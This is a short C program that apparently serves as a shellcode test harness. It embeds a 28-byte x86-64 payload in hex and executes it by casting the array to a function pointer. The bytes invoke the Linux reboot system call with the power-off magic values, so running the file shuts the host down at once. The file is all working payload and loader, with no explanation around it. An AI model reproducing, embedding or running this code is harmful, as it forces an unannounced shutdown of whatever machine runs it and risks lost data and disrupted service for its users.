#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x68\xdc\xfe\x21\x43\x5a\xbe\x69\x19\x12\x28\xf8\x41\xbc\xad\xde\xe1\xfe\x41\x87\xfc\x48\x31\xc0\x04\xa9\x0f\x05";

main()
{

	printf("Shellcode Length:  %d\n", (int)strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}